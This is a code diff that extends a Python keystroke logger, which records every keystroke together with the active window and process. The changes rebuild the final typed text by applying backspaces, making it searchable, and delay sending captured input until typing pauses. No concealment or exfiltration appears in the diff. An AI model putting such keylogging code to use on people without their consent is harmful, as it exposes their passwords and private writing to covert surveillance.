@@ -2,6 +2,7 @@
 Keystroke Logger Module
 Captures all keystrokes with context
 """
+import re
 import threading
 import time
 from datetime import datetime
@@ -42,6 +43,51 @@ class KeystrokeLogger:
         Key.print_screen: '[PRTSC]',
     }
     
+    @staticmethod
+    def reconstruct_text(raw_keys: str) -> str:
+        """
+        Reconstruct the final typed text by applying backspaces/deletes.
+        This makes the text searchable (e.g., "hello dear[BACKSPACE]x4 alex" -> "hello alex")
+        """
+        result = []
+        i = 0
+        
+        while i < len(raw_keys):
+            # Check for special keys
+            if raw_keys[i] == '[':
+                # Find the closing bracket
+                end = raw_keys.find(']', i)
+                if end != -1:
+                    special = raw_keys[i:end+1]
+                    
+                    if special == '[BACKSPACE]':
+                        # Remove last character if exists
+                        if result:
+                            result.pop()
+                    elif special == '[DELETE]':
+                        # DELETE typically removes char at cursor - for simplicity, ignore
+                        pass
+                    elif special == '[ENTER]':
+                        result.append('\n')
+                    elif special == '[TAB]':
+                        result.append('\t')
+                    elif special.startswith('[CTRL+') or special.startswith('[ALT+'):
+                        # Shortcuts don't produce text, skip them
+                        pass
+                    # Other special keys (arrows, etc.) don't add text
+                    
+                    i = end + 1
+                    # Handle newline after [ENTER]
+                    if special == '[ENTER]' and i < len(raw_keys) and raw_keys[i] == '\n':
+                        i += 1
+                    continue
+            
+            # Regular character
+            result.append(raw_keys[i])
+            i += 1
+        
+        return ''.join(result)
+    
     def __init__(self, event_callback):
         """
         Initialize keystroke logger
@@ -52,7 +98,7 @@ class KeystrokeLogger:
         self.event_callback = event_callback
         self.buffer = []
         self.buffer_lock = threading.Lock()
-        self.last_flush = time.time()
+        self.last_keystroke = time.time()  # Track last keystroke for inactivity detection
         self.active_window = None
         self.active_process = None
         self.listener = None
@@ -106,6 +152,9 @@ class KeystrokeLogger:
                     'process': self.active_process
                 })
                 
+                # Update last keystroke time for inactivity detection
+                self.last_keystroke = time.time()
+                
                 # Flush if buffer is full
                 if len(self.buffer) >= KEYSTROKE_BUFFER_SIZE:
                     self._flush_buffer()
@@ -154,15 +203,21 @@ class KeystrokeLogger:
             # Send events
             for group in groups:
                 window, process = group['key']
+                raw_keys = group['chars']
+                
+                # Reconstruct the final text (applies backspaces/deletes)
+                reconstructed = self.reconstruct_text(raw_keys)
+                
                 self.event_callback({
                     'timestamp': group['start_time'],
                     'event_type': 'keystroke',
                     'category': 'input',
                     'data': {
-                        'keys': group['chars'],
+                        'keys': raw_keys,
+                        'text': reconstructed,  # Final searchable text
                         'target_window': window,
                         'target_process': process,
-                        'duration_chars': len(group['chars'])
+                        'duration_chars': len(raw_keys)
                     }
                 })
             
@@ -170,10 +225,15 @@ class KeystrokeLogger:
             self.last_flush = time.time()
     
     def _flush_timer(self):
-        """Background thread to flush buffer periodically"""
+        """Background thread to flush buffer after inactivity timeout"""
         while self.running:
             time.sleep(1)
-            if time.time() - self.last_flush >= KEYSTROKE_BUFFER_TIMEOUT:
+            # Flush only if there's been no typing for KEYSTROKE_BUFFER_TIMEOUT seconds
+            # This ensures we capture complete phrases before sending
+            with self.buffer_lock:
+                has_content = len(self.buffer) > 0
+            
+            if has_content and (time.time() - self.last_keystroke >= KEYSTROKE_BUFFER_TIMEOUT):
                 self._flush_buffer()
     
     def start(self):
